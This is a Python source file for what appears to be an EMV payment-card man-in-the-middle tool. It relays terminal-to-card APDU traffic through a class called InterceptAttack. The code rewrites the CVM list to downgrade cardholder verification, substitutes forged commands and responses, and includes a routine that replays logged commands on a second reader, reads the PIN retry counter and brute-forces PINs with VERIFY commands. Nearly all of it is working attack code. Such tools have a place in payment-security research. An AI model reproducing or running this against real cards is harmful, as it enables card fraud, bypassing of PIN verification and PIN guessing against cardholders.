import logging
import util
import threading

from apdu_printer import APDUPrinter

from smartcard.util import toHexString, toBytes
import smartcard.Session
import smartcard.System

try:
    from emv_logger import EMVLogger as _EMVLogger
except ImportError:
    _EMVLogger = None

try:
    from mutation_engine import MutationEngine as _MutationEngine
except ImportError:
    _MutationEngine = None

logger = logging.getLogger()

class InterceptAttack(object):
    def __init__(self, os, response, allresponse, allcommand, command, cvm, brutef, chkcounter):
        # Global variables
        self.os = os
        self.response = response
        self.allr = allresponse
        self.allc = allcommand
        self.command = command
        self.cvm = cvm
        self.brutef = int(brutef)
        self.checkpinc = chkcounter

        self.debug = 1

        self.logcmds = [] # To save terminal commands

        self.brutef1 = '00' #Default initial PIN for brute force attack
        self.brutef2 = '00'
        self.pintries= 3
        self.pinc = ['80', 'CA', '9F', '17', '00'] #Check pin counter
        self.pinv = ['80', 'CA', '9F', '17', '04'] #Get value

        self.printer = APDUPrinter()

        self._emv = _EMVLogger.from_config("emv_logger.yaml") if _EMVLogger else None
        self._mut = _MutationEngine.from_config("mutations.yaml", os=self.os) if _MutationEngine else None

        if self.checkpinc == "1":
                print("Check PIN RETRY Counter enabled!")

        if self.brutef > 0:
                print("Brute-force activated!")
                print("Loading/waiting for data...")

    def index_of(self, val, in_list, fromw = 0): # Search for specific values in a list 
        try:
            return in_list.index(val.upper(),fromw)
        except ValueError:
            return -1 

    def findvalue(self, data, fvalue): # Search for command or reponse values in a list
        positiondata = 0
        foundcmd = False
        mdata = []
        cmd = []

        # fvalue must be a sequence with at least 2 elements ([cmd_hex, data_hex]).
        # The legacy "disabled" sentinel is the string "0", which has len 1.
        if fvalue and not isinstance(fvalue, str) and len(fvalue) >= 2:

            cmd = fvalue[0]
            cmd = [cmd[i:i+2] for i in range(0, len(cmd), 2)]

            mdata = fvalue[1]
            mdata = [mdata[i:i+2] for i in range(0, len(mdata), 2)]

            positiondata = self.index_of(cmd[0], data)
            if (positiondata >= 0):
                foundcmd = True

                if (len(cmd) > 1):
                    foundcmd = False
                    prevposition = positiondata
                    positiondata = self.index_of(cmd[1], data, positiondata)
                    if (prevposition+1 == positiondata):
                        positiondata = prevposition
                        foundcmd = True

        return foundcmd, positiondata, mdata

    def attacker_mitm(self, msg, typec): # Man in The Middle main function

        if (self.cvm != "0" and typec == 3): #Change CVM
            data = util.to_hex(msg)
            data = data.split()
            rdata = data
            findcvm = self.index_of('8E', rdata, 0)

            if (findcvm > 0): #and findcvm < 10):
                print("Found CVM tag!")

                lencvm = int(rdata[findcvm+1],16)

                ncvm = [self.cvm[i:i+2] for i in range(0, len(self.cvm), 2)]
                for x in range(1, lencvm):
                    whereat = findcvm+1+x

                    if rdata[whereat] != '00':
                        rdata[whereat] = ncvm[0]

                        if (len(ncvm) > 1):
                            rdata[whereat+1] = ncvm[1]

                        break

                pmsg = ""
                pmsg = ''.join(rdata)
                pmsg = util.from_hex(pmsg)


                self.printer.show_response(pmsg, 'Changed CVM')
                return pmsg

            return msg

        if (self.command and typec == 1): #Modify command
            data = util.to_hex(msg)
            data = data.split()
            
            foundcmd, positiondata, mdata = self.findvalue(data, self.command)

            if (foundcmd):
                rdata = data

                if (self.allc == '1'): #Change all the command
                        positiondata = 0
                        rdata = []

                for x in range(0, len(mdata)):
                        if self.allc == '1': #change all the command
                                rdata.append(mdata[x])
                        else:
                                rdata[positiondata] = mdata[x]
                        positiondata += 1
                positiondata += 5

                for x in range(0, len(mdata)):
                        if self.allc == '1': #change all the command
                                rdata.append(mdata[x])
                        else:
                                rdata[positiondata] = mdata[x]
                        positiondata += 1


                pmsg = ""
                pmsg = pmsg.join(rdata)
                pmsg = util.from_hex(pmsg)

                self.printer.show_command(msg, 'Original command')
                self.printer.show_command(pmsg, 'Attacker command')
                msg = pmsg

            else:
                if self.debug:
                        self.printer.show_command(msg, 'Terminal command')

            resp = self.os.execute(msg)
            if self.debug:
                self.printer.show_response(resp, 'Response')
            self.read_response(msg, resp)

            return resp

        if (self.allr and typec == 2): #Modify all the answer
            data = util.to_hex(msg)
            data = data.split()
            
            foundcmd, positiondata, mdata = self.findvalue(data, self.allr)

            if (foundcmd):
                msg = ""
                msg = msg.join(mdata)
                mdata = msg
                return util.from_hex(mdata)
            else:
                return 

        if (self.response and typec == 3): #Modify part of the answer
            ans = None
            data = util.to_hex(msg)
            data = data.split()
            
            foundcmd, positiondata, mdata = self.findvalue(data, self.response)

            if (foundcmd):
                rdata = data

                #check if there is enough space for the modification
                if len(rdata) - positiondata < len(mdata):
                    print("Found tag! but not enough space to add the new value!")
                    ans = msg
                    return ans

                for x in range(0, len(mdata)):
                    rdata[positiondata] = mdata[x]
                    positiondata += 1

                pans = ""
                pans = pans.join(rdata)
                pans = util.from_hex(pans)
                self.printer.show_response(pans, 'Attacker response')
                ans = pans
            else:

                ans = msg

            return ans
        return msg

    def brutefpin(self): #Brute force PIN Retry Counter
        if self.debug:
                print(self.logcmds)
        #return

        if self.logcmds:
                print("\nInitializing with PIN: "),
                print(self.brutef1),
                print(self.brutef2)

                # Open a second reader session to check for PIN RETRY Counter keeping live the first session of the card
                reader = smartcard.System.listReaders()
                self.session = smartcard.Session(reader[2])
                atr = self.session.getATR()

                for x in range(0,len(self.logcmds)):
                        pans = ""
                        pans = pans.join(self.logcmds[x])
                        pans = toBytes(pans) 

                        rapdu, sw1, sw2 = self.session.sendCommandAPDU(pans)
                        apdu = toHexString(rapdu)

                        if self.debug:
                                print("Replaying command: "),
                                print(self.logcmds[x])
                                print("Card response: "),
                                if apdu:
                                        print(apdu)
                                else:
                                        print(toHexString([sw1]+[sw2]))
                                print('--')

                        if self.logcmds[x+1][1] == 'AE':
                                pinc =[0x80, 0xca, 0x9f, 0x17, 0x00] #Check pin counter
                                pinv =[0x80, 0xca, 0x9f, 0x17, 0x04] #Get value
                                pininit = [0x00, 0x20, 0x00, 0x80, 0x08, 0x24]
                                pinrest = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF]

                                print("Check RETRY PIN Counter: "),
                                print(toHexString(pinc))

                                rapdu, sw1, sw2 = self.session.sendCommandAPDU(pinc)

                                print("Card response: "),
                                if rapdu:
                                        print(toHexString(rapdu))
                                else:
                                        print(toHexString([sw1]+[sw2]))
                                print('--')

                                print("GET DATA - RETRY PIN Counter: "),
                                print(toHexString(pinv))

                                rapdu, sw1, sw2 = self.session.sendCommandAPDU(pinv)

                                print("Card response: "),
                                if rapdu:
                                        print(toHexString(rapdu))
                                else:
                                        print(toHexString([sw1]+[sw2]))
                                print('--')

                                if (rapdu):
                                        print("Checking how many PIN attempts left... "),
                                        print(toHexString(rapdu)),
                                        print("Total: "),
                                        print(rapdu[3])
                                else:
                                        print("Error - could not detect Plain PIN by ICC method: "),
                                        print(toHexString([sw1]+[sw2]))
                                        break

                                if (rapdu[3] > 0 and self.brutef > 0):
                                        print("\nInitializing brute force with PIN: "),
                                        print(self.brutef1),
                                        print(self.brutef2)  
                                        for x in range(self.pintries):
                                                print("Trying PIN: "),
                                                print(self.brutef1),
                                                print(self.brutef2)
                                                pin = pininit
                                                pin = pin+toBytes(self.brutef1)+toBytes(self.brutef2)+pinrest
                                                print("Sending PIN: "),
                                                print(toHexString(pin))

                                                rapdu, sw1, sw2 = self.session.sendCommandAPDU(pin)

                                                print("Raw answer to PIN request: "),
                                                print(toHexString([sw1]+[sw2]))

                                                if (sw1 == 0x90 and sw2 == 0x00):
                                                        print("!!Correct PIN: "),
                                                        print(self.brutef1),
                                                        print(self.brutef2)
                                                        #self.brutef = 0
                                                        return

                                                if (int(self.brutef2) < 99):
                                                        self.brutef2 = "%02d" % (int(self.brutef2)+1,)
                                                else:
                                                        if (int(self.brutef1) < 99):
                                                                self.brutef2 = '00'
                                                                self.brutef1 = "%02d" % (int(self.brutef1)+1,)
                                                        else:
                                                                print("Couln't find the PIN!")
                                                                self.brutef1 = '00'
                                                                self.brutef2 = '00'
                                                                #self.brutef = 0
                                                                return
                                                if(sw1 == 0x69 and sw2 == 0x83):
                                                        print("No more tries!")
                                                        return

                                        #self.brutef = "0"
                                        print("Could not find the PIN in this try, reset the counter!")
                                        break
                                else:
                                        break
                self.logcmds = []
                self.session.close()

    def user_execute(self, msg): #Main function to interact with commands and responses

        if self._emv:
            msg = self._emv.on_command(msg)

        if self._mut:
            msg = self._mut.on_command(msg)

        ans = None
        if self.command: # Change command?
                ans = self.attacker_mitm(msg,1)
        else:
                if not self.debug:
                        print("Processing card data...")

                if self.debug:
                        self.printer.show_command(msg, 'Terminal command')


        data1 = util.to_hex(msg)
        data1 = data1.split()
        self.logcmds.append(data1)

        # This print might help for debugging and learn about the commands
        #print(self.logcmds)

        if ans == None:
                ans = self.os.execute(msg)
                #data2 = util.to_hex(msg)
                #data2 = data2.split()

                data3 = util.to_hex(ans)
                data3 = data3.split()

                if len(data3) > 10:
                        if ((data3[3] == '9F' and data3[4] == '27' and data3[6] == '40') or (data3[2] == '9F' and data3[3] == '27' and data3[5] == '40')):
                                if self.checkpinc == '1' or self.brutef > 0:
                                        print("Checking the PIN RETRY Counter!")
                                        self.brutefpin()
                        if ((data3[1] == '12' and data3[2] == '40') or (data3[1] == '12' and data3[2] == '00')):
                                if self.checkpinc == '1' or self.brutef > 0:
                                        print("Checking the PIN RETRY Counter!")
                                        self.brutefpin()
                if (self.debug):
                        self.printer.show_response(ans, 'Original Response')

        fake_resp = None
        if (self.allr): #Change all the response?
                fake_resp = self.attacker_mitm(ans,2)

        if (fake_resp): #If the response is different than the original
                self.printer.show_response(fake_resp, 'Changed all response')
                ans = fake_resp
        else:
                if (self.cvm or self.response):
                        ans = self.attacker_mitm(ans,3)

        if self._mut:
            ans = self._mut.on_response(msg, ans)

        if self._emv:
            ans = self._emv.on_response(msg, ans)
        return ans

    def read_response(self, msg, resp):
        pass
